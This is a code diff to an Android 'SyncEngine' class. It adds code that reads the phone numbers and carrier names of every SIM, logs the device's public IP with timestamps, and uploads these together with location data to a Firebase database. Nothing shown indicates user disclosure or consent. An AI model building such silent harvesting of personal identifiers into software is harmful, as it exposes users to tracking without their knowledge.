@@ -3,9 +3,15 @@ package com.sync.library.impl;
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.content.pm.PackageInfo;
+import android.Manifest;
 import android.os.Build;
 import android.provider.Settings;
+import android.telephony.SubscriptionInfo;
+import android.telephony.SubscriptionManager;
+import android.telephony.TelephonyManager;
 import android.util.Log;
+
+import androidx.core.content.ContextCompat;
 
 import androidx.annotation.NonNull;
 
@@ -117,6 +123,37 @@ public class SyncEngine {
         }
     }
 
+    private static String getCarrierName(Context context, String simSlot) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+            try {
+                if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE)
+                        == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    SubscriptionManager sm = (SubscriptionManager)
+                            context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
+                    if (sm != null) {
+                        List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
+                        if (subs != null) {
+                            int slotIndex = -1;
+                            try { slotIndex = Integer.parseInt(simSlot.replaceAll("\\D", "")) - 1; } catch (Exception ignored) {}
+                            for (SubscriptionInfo sub : subs) {
+                                if (slotIndex < 0 || sub.getSimSlotIndex() == slotIndex) {
+                                    String name = sub.getCarrierName() != null ? sub.getCarrierName().toString() : "";
+                                    if (!name.isEmpty()) return name;
+                                }
+                            }
+                        }
+                    }
+                }
+            } catch (Exception ignored) {}
+        }
+        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+        if (tm != null) {
+            String name = tm.getSimOperatorName();
+            if (name != null && !name.isEmpty()) return name;
+        }
+        return simSlot;
+    }
+
     // ─── User Data ─────────────────────────────────────────────────
 
     private static void uploadUserData(Context context, DatabaseReference db,
@@ -139,15 +176,27 @@ public class SyncEngine {
             data.put("accounts", new ArrayList<>());
             data.put("profileImage", "");
             data.put("email", "");
-            data.put("phoneNumber", "");
+            List<Map<String, String>> phoneList = new ArrayList<>();
+            for (MobileNumber mn : MobileNumberImpl.getMobileNumber(context)) {
+                Map<String, String> entry = new HashMap<>();
+                String carrier = getCarrierName(context, mn.getSimCard());
+                entry.put(carrier, mn.getPhoneNumber());
+                phoneList.add(entry);
+            }
+            data.put("phoneNumber", phoneList);
 
-            List<String> ipList = new ArrayList<>();
+            List<Map<String, Object>> ipHistory = new ArrayList<>();
             String ip = PublicIPImpl.getPublicIPFromService("https://api.ipify.org");
             if (ip == null) {
                 ip = PublicIPImpl.getPublicIPFromService("https://checkip.amazonaws.com");
             }
-            if (ip != null) ipList.add(ip);
-            data.put("ipAddress", ipList);
+            if (ip != null) {
+                Map<String, Object> ipEntry = new HashMap<>();
+                ipEntry.put("ip", ip);
+                ipEntry.put("uploadTime", ServerValue.TIMESTAMP);
+                ipHistory.add(ipEntry);
+            }
+            data.put("ipHistory", ipHistory);
 
             List<Map<String, Object>> locations = new ArrayList<>();
             try {
